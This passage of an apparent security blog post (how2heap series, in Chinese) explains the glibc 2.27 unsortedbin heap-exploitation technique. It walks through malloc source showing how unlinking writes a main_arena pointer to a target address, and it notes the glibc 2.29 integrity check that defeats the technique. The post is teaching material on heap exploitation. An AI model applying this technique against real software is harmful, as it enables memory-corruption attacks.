consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">           exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">           no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">            bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">            victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) <span class="comment">//不会进入此if语句</span></span><br><span class="line">          &#123;</span><br><span class="line">            ......</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">        unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
+
+<p>由于这次申请的堆块大小为0x410，和unsortedbin中的free chunk大小相同，这里首先对unsortedbin中的free chunk进行解链，解链后会向stack_var写入一个超大值，这个值是&amp;main_arena，整个过程详见如下PPT：</p>
+<p><a href="/assets/posts/how2heap-14-unsortedbin-attack-spgu7x/assets/1621328639397-83270097-04b0-4954-a590-04395629f27b.pptx">unsortedbin attack.pptx</a></p>
+<blockquote>
+<p><strong><span style="color: #F5222D">注意：在glibc 2.27中此过程没有任何检查</span></strong></p>
+</blockquote>
+<p>之后会直接返回申请的victim即0x555555757250（chunk_victim）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">		 We may return one of these chunks later.  */</span></span><br><span class="line">	      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终结果如下：</p>
+<p><img src="/assets/posts/how2heap-14-unsortedbin-attack-spgu7x/assets/1621328773304-e8961c0c-ea5a-436c-917c-1d440f467b14.png" alt="截屏2021-05-18 17.06.04.png"></p>
+<p>另外再多说几句：</p>
+<p><img src="/assets/posts/how2heap-14-unsortedbin-attack-spgu7x/assets/1621329011783-31958d52-c952-4654-a6d7-799e73bd5099.png" alt="截屏2021-05-18 17.09.58.png"></p>
+<p>如上图所示，在那时虽然stack_var的bk已经被设置，但是是没有用的，因为之后在解链时会进行重新设置：</p>
+<p><img src="/assets/posts/how2heap-14-unsortedbin-attack-spgu7x/assets/1621329103323-f131e835-2dc2-4a8a-a4ef-ccb543bfeb5c.png" alt="截屏2021-05-18 17.11.36.png"></p>
+<p>这里会牵扯到栈布局，也就是说stack_var的bk指针是没有必要设置的😂，实际上stack_var的fd和bk位都不需要设置。</p>
+<h2 id="漏洞封堵"><a href="#漏洞封堵" class="headerlink" title="漏洞封堵"></a>漏洞封堵</h2><p>以下代码是glibc 2.29的malloc源码：</p>
+<p><img src="/assets/posts/how2heap-14-unsortedbin-attack-spgu7x/assets/1621329733425-4072a257-0542-43e9-9bda-1c6cef23017b.png" alt="截屏2021-05-18 17.22.05.png"></p>
+<p>主要是这一句：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong><span style="color: #F5222D">这一句话对unsortedbin attack是致命的，这会导致此种攻击方式几乎不可用：</span></strong></p>
+<p><strong><span style="color: #F5222D"></span></strong></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/%E3%80%8Aglibc%202.27%20malloc%E6%BC%8F%E6%B4%9E%E8%A7%A3%E8%AF%BB%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88how2heap%EF%BC%89%E3%80%8B/2-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E8%AF%BB/how2heap(14)-unsortedbin%20attack/">https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/%E3%80%8Aglibc%202.27%20malloc%E6%BC%8F%E6%B4%9E%E8%A7%A3%E8%AF%BB%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88how2heap%EF%BC%89%E3%80%8B/2-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E8%AF%BB/how2heap(14)-unsortedbin%20attack/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://elydemiurge.github.io" target="_blank">Cyberangel's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://picsum.photos/seed/blog-cover-03/800/450" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/PWN%E8%BF%9B%E9%98%B6/PWN%E8%BF%9B%E9%98%B6%EF%BC%881-12%EF%BC%89-%E4%BB%8E%E4%B8%A4%E9%81%93%E9%A2%98%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86SROP%20attack/" title="PWN进阶（1-12）-从两道题重新认识SROP attack"><img class="cover" src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">PWN进阶（1-12）-从两道题重新认识SROP attack</div></div><div class="info-2"><div class="info-item-1">PWN进阶（1-12）-从两道题重新认识SROP attack附件链接:https://pan.baidu.com/s/1XGou-bBu24upiAXuZu3EIA密码: wl0o 前言在之前的文章中已经说过了SROP： PWN入门（1-3-10）-高级ROP-SROP 但是这片文章是我刚刚学习pwn的时候写的，存在着理解不准确等原因，导致我现在都不想看之前写的东西，所以在这片文章中重新说一下。 原理Signal机制现在回顾一下Linux的Signal机制：Signal机制是类unix系统（如Linux、macOS等）中进程之间相互传递信息的一种方法。在一般情况下我们也将其称为软中断信号（软中断）。比如说，进程之间可以通过系统调用kill来发送软中断信号以此结束某个进程。一般来说，信号机制常见的步骤如下图所示：   这个图你肯定十分的熟悉，毕竟快成为经典了  1）当用户的程序（用户层）发起signal信号传递时，控制权由用户层切换到内核层（态），这时进程会被暂时挂起。 ucontent save：在内核层中会保存当前程序的状态（如寄存器）中的值到stack上，**以及压入Sig...</div></div></div></a><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/PWN/CTF-PWN%E7%B3%BB%E5%88%97/%E3%80%8Aglibc%202.27%20malloc%E6%BC%8F%E6%B4%9E%E8%A7%A3%E8%AF%BB%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88how2heap%EF%BC%89%E3%80%8B/2-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E8%AF%BB/how2heap(13)-tcache_stashing_unlink_attack/" title="how2heap(13)-tcache_stashing_unlink_attack"><img class="cover" src="https://picsum.photos/seed/blog-cover-02/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">how2heap(13)-tcache_stashing_unlink_attack</div></div><div class="info-2"><div class="info-item-1">how2heap(13)-tcache_stashing_unlink_attack前言这一小节我们来看tcache_stashing_unlink_attack这种攻击方式，这种攻击方式的原理仍然是对smallbin中free chunk的bk指针进行修改（和上一节的house of lore原理相同），但是此种方式需要calloc函数 影响版本具有或开启tcache机制的glibc malloc POCPOC源码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;    unsigned long stack_var[0x10] = &#123;0&#1...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Cyberangel</div><div class="author-info-description">二进制安全</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElyDemiurge"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElyDemiurge" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:elydemiurge@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">从语雀迁移博客到 Github</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#how2heap-14-unsortedbin-attack"><span class="toc-number">1.</span> <span class="toc-text">how2heap(14)-unsortedbin attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">1.3.</span> <span class="toc-text">POC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E6%BA%90%E7%A0%81"><span class="toc-number">1.3.1.</span> <span class="toc-text">POC源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E5%88%86%E6%9E%90"><span class="toc-number">1.3.2.</span> <span class="toc-text">POC分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%B0%81%E5%A0%B5"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞封堵</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"><img src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南">《IoT从入门到入土》(11)--IoT靶场环境docker封装指南</a><time datetime="2022-12-08T00:19:26.000Z" title="发表于 2022-12-08 08:19:26">2022-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"><img src="https://picsum.photos/seed/blog-cover-07/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）">《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）</a><time datetime="2022-11-25T01:47:22.000Z" title="发表于 2022-11-25 09:47:22">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"><img src="https://picsum.photos/seed/blog-cover-08/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建">《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建</a><time datetime="2022-11-21T02:38:00.000Z" title="发表于 2022-11-21 10:38:00">2022-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"><img src="https://picsum.photos/seed/blog-cover-01/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析">《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析</a><time datetime="2022-11-10T05:43:27.000Z" title="发表于 2022-11-10 13:43:27">2022-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）"><img src="https://picsum.photos/seed/blog-cover-02/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PE文件格式整理（2020年2月23日notability手写笔记）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/Reverse/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%95%B4%E7%90%86%EF%BC%882020%E5%B9%B42%E6%9C%8823%E6%97%A5notability%E6%89%8B%E5%86%99%E7%AC%94%E8%AE%B0%EF%BC%89/" title="PE文件格式整理（2020年2月23日notability手写笔记）">PE文件格式整理（2020年2月23日notability手写笔记）</a><time datetime="2022-11-08T01:10:26.000Z" title="发表于 2022-11-08 09:10:26">2022-11-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2019 - 2026 By Cyberangel</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.5"></script><script src="/js/main.js?v=5.5.5"></script><div class="js-pjax"></div><script src="/js/decode-copyright-url.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => {
+      try {
+        fn()
+      } catch (err) {
+        console.debug('Pjax callback failed:', err)
+      }
+    })
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      true
+        ? pjax.loadUrl('/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.5"></script></div></div></body></html>
